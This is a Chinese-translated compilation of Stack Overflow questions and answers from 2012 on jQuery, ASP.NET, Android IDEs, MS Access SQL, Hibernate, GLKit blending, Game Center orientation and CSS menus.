更多信息： [http ://social.msdn.microsoft.com/Forums/en/parallelextensions/thread/7b3a42e5-4ebf-405a-8ee6-bcd2f0214f85](http://social.msdn.microsoft.com/Forums/en/parallelextensions/thread/7b3a42e5-4ebf-405a-8ee6-bcd2f0214f85)

# javascript - Safari (Mac OS) 上的 jQuery 平滑滚动问题

> ID：12427965
> 
> 赞同：3
> 
> 时间：2012-09-14T15:53:42.547
> 
> 标签：javascript, jquery, html, safari

我在 Safari 上遇到了一个奇怪的问题（仅限 Mac OS，Windows 工作正常），我的平滑滚动没有滚动。它只是跳转到链接，但适用于所有其他浏览器，甚至在 Windows Safari 上。

我的 jQuery 是

```
 <script type="text/javascript">
        (function($){
    $.extend({   
        smoothAnchors : function(speed, easing, redirect){  
            speed = speed || "slow";
            easing = easing || null;
            redirect = (redirect === true || redirect == null) ? true : false;
            $("a").each(function(i){            
                var url = $(this).attr("href");
                if(url){
                    if(url.indexOf("#") != -1 && url.indexOf("#") == 0){
                        var aParts = url.split("#",2);
                        var anchor = $("a[name='"+aParts[1]+"']");
                        if(anchor){                                                         
                            $(this).click(function(){                      
                                if($(document).height()-anchor.offset().top >= $(window).height()
                                 || anchor.offset().top > $(window).height()
                                 || $(document).width()-anchor.offset().left >= $(window).width()
                                 || anchor.offset().left > $(window).width()){                 
                                    $('html, body').animate({
                                        scrollTop: anchor.offset().top,
                                        scrollLeft: anchor.offset().left
                                    }, speed, easing, function(){
                                        if(redirect){ 
                                            window.location = url 
                                        }
                                    });
                                }
                                return false;                           
                            });
                        }
                    }   
                }
            });
        }
    });
})(jQuery);
</script> 
```

我的 HTML 看起来像这样

```
<nav id="nav">
<ul id="navigation">
    <li><a href="#About" class="fade"> ABOUT</a></li>
<a name="About"></a> 
```

如果有人知道是什么问题，请告诉我！

非常感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T00:42:20.363

对我有用！

```
(function($) {
    $.fn.SmoothAnchors = function() {

        function scrollBodyTo(destination, hash) {

            // Change the hash first, then do the scrolling. This retains the standard functionality of the back/forward buttons.
            var scrollmem = $(document).scrollTop();
            window.location.hash = hash;
            $(document).scrollTop(scrollmem);
            $("html,body").animate({
                scrollTop: destination
            }, 200);

        }

        if (typeof $().on == "function") {
            $(document).on('click', 'a[href^="#"]', function() {

                var href = $(this).attr("href");

                if ($(href).length == 0) {

                    var nameSelector = "[name=" + href.replace("#", "") + "]";

                    if (href == "#") {
                        scrollBodyTo(0, href);
                    }
                    else if ($(nameSelector).length != 0) {
                        scrollBodyTo($(nameSelector).offset().top, href);
                    }
                    else {
                        // fine, we'll just follow the original link. gosh.
                        window.location = href;
                    }
                }
                else {
                    scrollBodyTo($(href).offset().top, href);
                }
                return false;
            });
        }
        else {
            $('a[href^="#"]').click(function() {
                var href = $(this).attr("href");

                if ($(href).length == 0) {

                    var nameSelector = "[name=" + href.replace("#", "") + "]";

                    if (href == "#") {
                        scrollBodyTo(0, href);
                    }
                    else if ($(nameSelector).length != 0) {
                        scrollBodyTo($(nameSelector).offset().top, href);
                    }
                    else {
                        // fine, we'll just follow the original link. gosh.
                        window.location = href;
                    }
                }
                else {
                    scrollBodyTo($(href).offset().top, href);
                }
                return false;
            });
        }
    };
})(jQuery);

$(document).ready(function() {
    $().SmoothAnchors();
}); 
```

[https://github.com/alextrob/SmoothAnchors](https://github.com/alextrob/SmoothAnchors)

# javascript - 计算 id 以某个字符串开头的元素

> ID：12427967
> 
> 赞同：4
> 
> 时间：2012-09-14T15:53:46.723
> 
> 标签：javascript, jquery

> **可能重复：**
> [jQuery 返回 ID 以某个字符串开头的元素](https://stackoverflow.com/questions/897025/jquery-return-elements-where-id-begins-with-a-certain-string)

好的，假设我有以下元素：

```
<select id="state_id" value="20">test1</select>
<select id="state_id1" value="21">test2</select>
<select id="state_id2" value="22">test3</select> 
```

在这种情况下，如何获取`length()`id 开头的选择标签`state_id`？

我试过了：`$("^#state_id").length();`但没有成功。

有什么提示吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-14T15:55:40.300

尝试这个...

```
$('[id^=state_]').length 
```

# asp.net - Ajax UpdatePanel 没有触发？

> ID：12427968
> 
> 赞同：0
> 
> 时间：2012-09-14T15:53:47.383
> 
> 标签：asp.net, ajax

我不明白为什么这不会触发。它甚至不会调用该事件。有什么想法吗？我真正想做的是防止完全回发。页面很大，每次回帖都会跳到顶部。

```
<asp:UpdatePanel runat="server" id="UpdatePanel" updatemode="Conditional">

    <ContentTemplate>

    <p>
        <asp:Label runat="server" ID="lblSnippet" AssociatedControlID="cmbSnippet">

            From snippet:

        </asp:Label>

        <asp:DropDownList runat="server" ID="cmbSnippet" CssClass="dropdown" AutoPostBack="true">
            <asp:ListItem>
                None
            </asp:ListItem>

            <asp:ListItem>
                Read Part
            </asp:ListItem>

            <asp:ListItem>
                Read Feed
            </asp:ListItem>
        </asp:DropDownList>

    </p>

    <!--Code-->

    <p>    
        <asp:Label runat="server" ID="lblCode" AssociatedControlID="txtCode">

            From code:

        </asp:Label>

        <asp:TextBox runat="server" ID="txtCode" TextMode="MultiLine" CssClass="editor" MaxLength="100" Height="200" Wrap="false" />
    </p>  

    </ContentTemplate>

    <Triggers>

         <asp:Asyncpostbacktrigger controlid="cmbSnippet" eventname="SelectedIndexChanged" />

    </Triggers>

</asp:UpdatePanel> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T13:11:23.617

你还没有像这样声明事件：

```
<asp:DropDownList runat="server" ID="cmbSnippet" CssClass="dropdown" AutoPostBack="true" OnSelectedIndexChanged="cmbSnippet_SelectedIndexChanged"> 
```

和他在代码隐藏中的相关处理程序......

# java - 安卓开发：Visual Studio + Java。有可能（值得一试）吗？

> ID：12427973
> 
> 赞同：19
> 
> 时间：2012-09-14T15:53:59.470
> 
> 标签：java, android, visual-studio

我知道有（昂贵的）框架可以让你在 VS C# 中编写 android 应用程序并将其编译为 android apk。

我也知道，可以在 VS 中编写 Java 应用程序（[链接](http://visualstudiogallery.msdn.microsoft.com/bc561769-36ff-4a40-9504-e266e8706f93)）。

是否有可能，甚至不比在 Eclipse 中更难，使用一些免费的插件/框架/工具在 Visual Studio 中编写 android 应用程序？是否可以编译 androids 应用程序，并在手机/虚拟设备中对其进行调试？

在不久的将来，我认为使用 Android Studio 将是最好的选择。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T16:06:14.370

我发现自己的情况和你一样：Visual Studio 是我的主要 IDE，但我目前正在开发一个 Android 项目。

我建议您再试一次 Eclipse。Android SDK 很好地集成到 Eclipse 中：例如，您有一个图形 UI 编辑器，感觉类似于 Visual Studio 中的 WPF 编辑器。是的，Eclipse 需要习惯，并且两者之间的切换会很麻烦，因为键盘快捷键的细微差别（跳转到定义是 Eclipse 中的 F3 和 VS 中的 F12；IntelliSense 自动完成是 Eclipse 中的 Enter 和 VS 中的 Tab 等.)，但您将通过使用“完成任务的正确工具”获得奖励。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-06-19T22:36:05.487

现在可以在 Visual Studio 中构建和调试 Java。享受。

[https://blogs.msdn.microsoft.com/vcblog/2015/11/06/java-debugging-and-language-support-in-visual-studio-for-android/](https://blogs.msdn.microsoft.com/vcblog/2015/11/06/java-debugging-and-language-support-in-visual-studio-for-android/)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-14T15:56:18.227

只需使用 Eclipse 用 Ja​​va 编写它们。VS 没有针对 Java 进行优化，并且 Eclise 拥有更大的有用插件生态系统。使用 VS 进行 Android 开发就像用汇编程序设计一个网站：它根本不是为此而设计的 :)。

你在问是否值得一试。那么“一试”比什么？您目前是否正在使用其他 IDE 开发应用程序，或者您从未开发过 android 应用程序并且您只知道 VS 并想在那里尝试一下？

如果您已经使用其他 IDE，请保留这些。如果这是您的第一个 android 项目，使用 Eclipse 会更容易，如上所述。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-14T15:58:16.427

就个人而言，我会使用 Eclipse 或 IntelliJ IDEA 来进行 Android 开发，因为它们都是本机 Java IDE。

您可能还想查看[AIDE](https://play.google.com/store/apps/details?id=com.aide.ui&hl=en)。它是一个集成到 Android 平台中的 IDE。您可以在 Android 设备上编写代码，IDE 可以从 IDE 部署和启动应用程序。它使在设备上的测试变得容易，它甚至可以与其他服务集成，例如 DropBox 和 GitHub。

另一方面，要在此基础上发展，您将不得不成为惩罚的贪食者。尝试在平板电脑/手机上编写整个应用程序。这并不容易...

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-06-30T15:08:26.247

你考虑过 Android Studio 吗？

从那里你可以更新你的键绑定（又名：快捷方式）：

**保留 Visual Studio 键映射：**

```
o   File | Settings | Key Bindings 
      KeyMaps | Visual Studio copy
o   Reset a key-shortcut
        Select a command in the Settings window and enter a key-combination 
```

**需要考虑的一些命令：**

```
      Build solution
       •    Other | Build
               Ctrl + Shift + B

   Renaming variables, methods, files, etc.
       •    Main Menu | Refactor | Rename…
               Ctrl + R, R

   Code Generation
       •    Main Menu | Code | Generate
               Ctrl + Period 
```

# sql - 在Access中的一个字段中连接多行？

> ID：12427975
> 
> 赞同：4
> 
> 时间：2012-09-14T15:54:16.107
> 
> 标签：sql, ms-access

> **可能重复：**
> [Ms Access Query: Concatenating Rows through a query](https://stackoverflow.com/questions/5517233/ms-access-query-concatenating-rows-through-a-query)

我有一个有很多列的表，但有两个感兴趣：订单号和产品类型。目前，该表的每个订单有多个产品类型。如果客户订购了电话服务、电视服务和互联网服务，那么将有三份记录——每种服务一份，但都具有相同的订单号。我想创建一个引用表来存储与客户订购的所有服务的串联字符串。通过这种方式，我可以使用这种更合乎逻辑的方法来总结我的数据。我正在使用标准的 Access 2010 数据库。

```
**Current table:**

Order Number | Product Types

100001 | TV

100001 | Phone

100001 | Internet

100002 | Phone

100003 | TV

100003 | Internet 
```

**所需的参考表**

```
100001 | TV/Phone/Internet

100002 | Phone

100003 | TV/Internet 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T16:14:58.060

Allen Browne 提供了一个您可能会发现对此有用的函数：[Concatenate values from related records](http://allenbrowne.com/func-concat.html)。将该函数的代码保存在标准模块中。

```
SELECT DISTINCT
    [Order Number],
    ConcatRelated("[Product Types]",
        "YourTable",
        "[Order Number] = " & [Order Number],
        "[Product Types]",
        "/"
        ) AS All_Product_Types
FROM YourTable; 
```

我在 Access 2007 中测试了该查询，您的示例数据保存在名为“ *YourTable* ”的表中。它返回了您要求的结果。但是，这仅适用于 Access 会话。如果您想从 Access 外部（如从 ASP）运行此查询，则用户定义的函数不可用，因此您会收到关于`ConcatRelated()`无法识别的错误。

因此，您可以在需要时使用查询来检索连接的值。但是，如果您*存储*这些连接的值，它们很快就会与基表数据的更改不同步。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:20:54.587

If I understand the question, you're asking how to get the order numbers of just those orders who have TV, AND phone, AND internet. If you're just interested in those order numbers you could run a query like:

```
SELECT Distinct Table1.OrderNumber
FROM (Select OrderNumber from Table1 where [product types]= "Internet")  AS i
    INNER JOIN ((Select OrderNumber from Table1 where [product types]="Phone")  AS p 
    INNER JOIN ((Select OrderNumber from Table1 Where [product types]= "TV")  AS tv 
    INNER JOIN Table1 ON tv.OrderNumber = Table1.OrderNumber) ON p.OrderNumber = Table1.OrderNumber) ON i.OrderNumber = Table1.OrderNumber; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T17:41:02.863

正如 onedaywhen 在 SO 的早期帖子中指出的那样，使用 ADO 更容易：示例查询：

```
 SELECT [Order Number], 
          ConcatADO("SELECT [Product Types] FROM Orders
                     WHERE [Order Number]=" & [Order Number],", "," : ") AS Cat
   FROM Orders
   GROUP BY [Order Number], 2; 
```

使用 ADO 的函数

```
Function ConcatADO(strSQL As String, strColDelim, _
   strRowDelim, ParamArray NameList() As Variant)

   Dim rs As New ADODB.Recordset
   Dim strList As String

   On Error GoTo Proc_Err

       If strSQL <> "" Then
           rs.Open strSQL, CurrentProject.Connection
           strList = rs.GetString(, , strColDelim, strRowDelim)
           strList = Mid(strList, 1, Len(strList) - Len(strRowDelim))
       Else
           strList = Join(NameList, strColDelim)
       End If

       ConcatADO = strList

   Exit Function

   Proc_Err:
       ConcatADO = "***" & UCase(Err.Description)
End Function 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T16:01:32.960

您不应创建连接记录的引用表。那就是对数据库进行非规范化。

您可以尝试如下所示的交叉表查询，但我尚未对其进行测试。你可以[在这里阅读](http://allenbrowne.com/ser-67.html)更多信息。

```
TRANSFORM First([Product Types]) AS Product
SELECT [Order Number], First([Product Types])
FROM CurrentTable
GROUP [Order Number] 
```

# java - 关闭休眠连接

> ID：12427976
> 
> 赞同：0
> 
> 时间：2012-09-14T15:54:23.680
> 
> 标签：java, hibernate

我正在使用`Hibernate`池`DB`。连接未正确关闭。我这样称呼：

```
HibernateManager.getSessionFactory().getCurrentSession().disconnect(); 
```

请帮帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:58:35.247

[`Session.disconnect()`](http://docs.jboss.org/hibernate/orm/4.1/javadocs/org/hibernate/Session.html#disconnect%28%29)不做你认为它做的事：

> 断开会话与其底层 JDBC 连接的连接。这适用于应用程序已向会话提供 JDBC 连接并且需要长会话（也称为会话）的情况。

通常，您只想关闭（）会话或让事务管理层处理获取和关闭连接。

# objective-c - GLKit 多边形半透明

> ID：12427978
> 
> 赞同：1
> 
> 时间：2012-09-14T15:54:32.253
> 
> 标签：objective-c, ios, opengl-es, opengl-es-2.0, glkit

我正在尝试使用 GLKit 绘制半透明多边形，但没有运气。所以我想知道是否有可能首先在 GLKit 中使用半透明多边形，因为我知道 OpenGL 的标准实现不支持它；但可以使用自定义着色器进行模仿。但是由于 GLKit 编译它自己的着色器，我需要知道我应该继续使用 GLKit 还是使用我自己的自定义着色器。我的代码如下：

```
// setup states
glEnable(GL_BLEND);
glBlendFuncSeparate(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA, GL_ONE, GL_ONE_MINUS_SRC_ALPHA);
glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);

self.effect.texture2d0.enabled   = GL_FALSE;
self.effect.colorMaterialEnabled = GL_TRUE;
self.effect.transform.modelviewMatrix = self.modelMatrix;

glEnableVertexAttribArray(GLKVertexAttribPosition);
glEnableVertexAttribArray(GLKVertexAttribColor);

[self.effect prepareToDraw];

// draw triangles
glVertexAttribPointer(GLKVertexAttribPosition, 3, GL_FLOAT, GL_FALSE, sizeof(LineVertex), &_vertices[0].pos);
glVertexAttribPointer(GLKVertexAttribColor, 4, GL_FLOAT, GL_FALSE, sizeof(LineVertex), &_vertices[0].color);

glDrawArrays(GL_TRIANGLES, 0, _vertexCount); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T22:49:38.657

问题原来是我之前在某个地方有 glEnable(GL_DEPTH_TEST)，它在 alpha 0.5 处停止了两个多边形，创建了与 alpha 1.0 的交集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-16T01:58:46.367

您的问题令人困惑，但听起来您有透明对象相互绘制？，如果是这种情况，请使用

```
glEnable(GL_BLEND);
glBlendFunc(GL_ONE, GL_ONE_MINUS_SRC_ALPHA); 
```

而不是你在那里得到的。

并检查诸如深度测试或模板测试之类的事情（不太可能但可能）不会阻止绘制事物...

# ios - 仅横向应用程序中的 GameCenter 身份验证引发 UIApplicationInvalidInterfaceOrientation

> ID：12427979
> 
> 赞同：23
> 
> 时间：2012-09-14T15:54:32.373
> 
> 标签：ios, orientation, ios6, landscape, game-center

问题：如果用户未登录 GameCenter 帐户 - GameCenter 身份验证视图以纵向模式启动（在 ios 5 中有一个模式对话框）要求登录。但是如果我在 xcode（项目摘要）或 supportInterfaceOrientationsForWindow 中禁用纵向模式： （因为我的应用程序应该只在横向模式下运行）我得到：

***由于未捕获的异常“UIApplicationInvalidInterfaceOrientation”而终止应用程序，原因：“支持的方向与应用程序没有共同的方向，并且 shouldAutorotate 返回 YES”***

如果我为 ipad/iphone 启用肖像（和/或注释掉supportedInterfaceOrientationsForWindow:)，它不会崩溃，但我不希望启用肖像模式。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-14T15:54:32.373

在编写此问题并尝试代码时，我似乎找到了解决方案：启用项目摘要中的所有方向并删除 application:supportedInterfaceOrientationsForWindow。

将此代码添加到 ViewController：

```
- (NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskLandscape;
} 
```

现在它可以无缝运行。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-15T06:27:20.937

添加到应用委托：

```
- (NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)w {

return (NSUInteger)[application supportedInterfaceOrientationsForWindow:w] | (1<<UIInterfaceOrientationPortrait);

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T16:09:28.447

我发现问题出在我的游戏中心。在模拟器中我还没有初始化游戏中心时，它想弹出登录视图，但在纵向模式下。一旦达到这一点，如果我不允许纵向，它就会崩溃。操作系统中的奇怪错误，因为游戏中心应该采用允许的方向，只是为了符合我们横向用户界面的意图。

我还没有解决方案，但如果我找到它，我会发布。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-02-16T18:08:12.923

捕捉异常对我来说似乎工作得很好：

```
@try {
    [rootNavigationController pushViewController:viewController animated:YES];
}
@catch (NSException *exception) {
    //somehow, catching this exception just allows the view controller to be shown?
} 
```

在 iOS 6.0 中，会抛出异常，但如果您捕获它，则仍会显示 viewController，并且 GameCenter 将在横向上按预期运行。

另一种解决方案是针对 iOS 6.1 及更高版本，因为 Apple 通过该版本修复了该错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-23T20:38:15.503

我遇到了和你一样的问题，我用一个有点丑陋的解决方法解决了这个问题，基本上我的应用程序中有一个全局变量，我用它来选择有效的界面方向是什么。在里面

```
 - (NSInteger)application : (UIApplication *)supportedInterfaceOrientationsForWindow:(UIWindow *)window{
          if(orientationIndicator == 1){
               return UIInterfaceOrientationMaskAllButUpsideDown;
          }
          else if(orientationIndicator == 2){
               return UIInterfaceOrientationMaskLandscape;
          }
     } 
```

要声明全局变量，请将其放入您的 appDelegate.m 文件中：

```
 int orientationIndicator = 1; 
```

要导入全局变量，请使用：

```
 extern int orientationIndicator; 
```

然后您可以更改方向指示器的值，它将允许您在不同的界面类型中运行。所以我所做的就是让orientationIndicator = 1开始。当你验证玩家并启动登录视图控制器时，将方向指示器设置为2。当你关闭视图（验证播放器）时，你可以将它改回1 .

这是一个棘手的工作，但它对我有用。

希望这可以帮助！

# css - 多级ul列表定位

> ID：12427980
> 
> 赞同：1
> 
> 时间：2012-09-14T15:54:32.810
> 
> 标签：css, list, positioning, unordered

我有一个深入三层的 ul 列表菜单。我希望所有 FirstMenu 列表项水平地彼此相邻，而嵌套和垂直对齐的 SecondMenus 和 ThirdMenus 位于三个水平的 FirstMenu 项*下方。*到目前为止，我在 CSS 中尝试过的任何操作（浮动、相对/绝对定位、边距/填充）都无法阻止 FirstMenus 下降到位于 SecondMenus 和 ThirdMenus 下方。欢迎提出建议！

```
 <ul id="footermenu">
     <li class="firstfootermenu">FirstMenu1      
      <ul class="subfootermenu">
        <li>SecondMenu1
          <ul class="subsubfootermenu">
            <li>ThirdMenu1</li>
            <li>ThirdMenu2</li>
            <li>ThirdMenu3</li>
         </ul>
       </li>
      </ul>
     </li>
    <li class="secondfootermenu"><a href="#">FirstMenu2</a></li>
    <li class="secondfootermenu"><a href="#">FirstMenu3</a></li>
   </ul> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:01:23.490

只需在第一个的直接后继上使用`display: inline-block; vertical-align: top`或：http : [//jsfiddle.net/jmAUJ/](http://jsfiddle.net/jmAUJ/)或[http://jsfiddle.net/8etkS/](http://jsfiddle.net/8etkS/)`float: left``ul`

编辑：用新布局更新了 jsFiddle [http://jsfiddle.net/jmAUJ/1/](http://jsfiddle.net/jmAUJ/1/)

# javascript - 选择后jQuery自动完成防止焦点

> ID：12427984
> 
> 赞同：2
> 
> 时间：2012-09-14T15:54:36.790
> 
> 标签：javascript, jquery

**要求：**

我想要一个 jQuery 自动完成元素，它允许用户选择一个项目并使用所选值设置显示字段和隐藏字段。但我也希望在输入字段获得用户焦点时清除该字段和隐藏字段。

**问题：**

我面临的问题是，当用户选择一个项目时，它几乎就像 jQuery 正在执行 onSelect 函数，然后再次将焦点发送到输入字段，这会触发我的 focus() 事件（并因此清除我的选择）。

**问题浏览器：**

IE8 ，在 Chrome 中工作。没有尝试其他人。

**尝试修复：**

*   我尝试将焦点设置到`select()` 函数中的另一个元素。它确实将焦点放在了该元素上，但只是在关注输入字段之后
*   在 select() 方法中`event.preventDefault()`都试过了。`event.stopPropagation()`不工作。
*   模糊也没有用。

**解决方法：**

我想我可以将清除更改为单击而不是焦点，但这不是我想要的。

**类似的stackoverflow线程：**

[提示后jquery自动完成删除焦点](https://stackoverflow.com/questions/5834990/jquery-autocomplete-remove-focus-after-suggest)

**代码：** 这是我的代码：

```
$(function () {
    $("#autosuggest").autocomplete({
        source: "my server path",
        minLength: 3,
        select: function (event, ui) {
            if (ui.item) {
                $("#autosuggest").val(ui.item.value);                    
                $("#hidden").val(ui.item.id);                                                                                
            }
        }
    });
    $("#autosuggest").focus(function () {
        $("#hidden").val("");
        this.value = "";
    });

}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:22:26.003

问题是：当您单击自动完成建议时，焦点会很快转移到该下拉菜单，然后返回您的输入。如果您使用向下箭头按钮选择自动完成建议，您是否仍然遇到此问题？如果你不这样做，那么这就是问题所在。

我能看到解决这个问题的唯一方法毕竟不是让它成为焦点事件，但我想我知道你为什么不想让它成为点击事件：你还想在字段中捕获制表符。

解决方案：使它成为一个点击处理程序，并添加一个“keyup”处理程序，如果键是一个选项卡，则执行点击处理程序处理程序（仍然允许向下箭头等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-22T18:31:27.073

尝试 onSelect 功能..

```
 $(function () {
    $("#autosuggest").autocomplete({
        source: "my server path",
        minLength: 3,
        select: function (event, ui) {
            if (ui.item) {
                $("#autosuggest").val(ui.item.value);                    
                $("#hidden").val(ui.item.id);                                                                                
            }
        },
        onSelect: function (suggestion) {
        $(this).click();}
    });
    $("#autosuggest").focus(function () {
        $("#hidden").val("");
        this.value = "";
    });

}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-12T04:24:48.200

我从 jQuery 论坛得到了这个，它工作得非常好！

```
select: function(event, ui) {
 $(event.target).autocomplete("close")
 setTimeout(function() {
  $(event.target).blur();
 })
} 
```

链接：[https ://forum.jquery.com/topic/autocomplete-input-field-stays-focused-after-selection](https://forum.jquery.com/topic/autocomplete-input-field-stays-focused-after-selection)

# javascript - 使用 jQuery 从原始页面内容创建 iframe

> ID：12427993
> 
> 赞同：1
> 
> 时间：2012-09-14T15:54:54.480
> 
> 标签：javascript, jquery, html, iframe

我正在尝试将整个页面动态“重写”为一组 iframe。我想要一个位于底部 iframe 的音乐播放器栏，并在其上方/后面的 iframe 中“重写”原始页面。几乎就像[SMC播放器](http://scmplayer.net/)一样。我觉得我很接近，但我是一个 jQuery 新手。所以任何指针都将事先不胜感激。

这是创建无法正常工作的 iframe 的主要部分。

```
var oldpage =  "<html>" + $("html").html() + "</html>";
$('body').html( "<iframe frameborder='0' id='content' allowtransparency='true' name='content'></iframe>" );
$('#content').contents().find('html').html(oldpage);
$('body').append("<iframe id='stratus' allowtransparency='true' frameborder='0' scrolling='0'>"); 
```

我正在尝试在第 1 行加载整个原始 html。然后创建 iframe 并尝试将 oldbody 变量注入新的 iframe #content。iframe 已创建，但 #content iframe 的正文为空白。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:01:27.100

我不知道为什么，但你不能替换整个 HTML 元素，只能替换它的内容：

```
// create raw frame
var frame = $('<iframe id="maincontent" style="position:absolute; top: 0; left: 0; width: 50%; height: 50%;"><html></html></iframe>');

// store a copy of current document contents
var copiedHead = $('head').clone();
var copiedBody = $('body').clone();

// empty the current document
$(':not(iframe) body *').remove();

// load the copy into the frame;
// it's not possible to replace the whole HTML element;
// using plain JS DOM function here, since jQuery would strip out any SCRIPT and STYLE tags
frame.load(function(){
    $(this).contents().find('html')[0].replaceChild(copiedHead[0] , $(this).contents().find('head')[0]);
    $(this).contents().find('html')[0].replaceChild(copiedBody[0] , $(this).contents().find('body')[0]);
}).appendTo('body'); 
```

# css - JQuery load() 函数禁用链接和：悬停效果？

> ID：12427997
> 
> 赞同：1
> 
> 时间：2012-09-14T15:55:16.230
> 
> 标签：css, jquery

我正在尝试使用 jQuery load() 函数将不同文件中的内容加载到当前文件中的 div 元素中。没什么特别的，只是加载它，就是这样。但是，加载文件中包含的链接变为“禁用”，您无法单击它们，并且 :hover 之类的伪类似乎也被排除在外。有针对这个的解决方法吗？

```
$(document).ready(function() {
    $("div.content").load("content.html");
}); 
```

假设 content.html 只包含这一行：

```
<a href="somelink.html">xxx</a> 
```

当它被加载到`<div class="content">`链接是不可点击的。它根据 css 着色，但是 :hover 效果不起作用，并且它的行为类似于普通文本 - 而不是链接。这是一个问题，因为我尝试加载的内容有几个链接，并且在加载（）之后它们都不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:24:48.500

我相信你的问题是：

*   您使用 $('div.content').load('content.html') 发送内容请求以（稍后）将其插入 DOM。
*   然后，您运行一些代码来使用 $(document).click、$(document).bind 等为节点指定处理程序 - 但此代码在新节点添加到 DOM 之前运行。
*   然后在 .load 调用完成时添加新节点。
*   *您在所有原始*节点上定义的行为不会在*新*节点上遵循。

如果这是您所描述的问题 - 那么您需要在创建新节点后将所有相同的绑定添加到新节点。

即您需要提供一个回调来将绑定添加到新元素：

```
function on_data_loaded() {
    $('div.content ...').hover(.....);
    // etc.
}
$('div.content').load('content.html', null, onloaded); 
```

（请注意，这不是一种特别干净的方法，但它应该解释需要做什么）。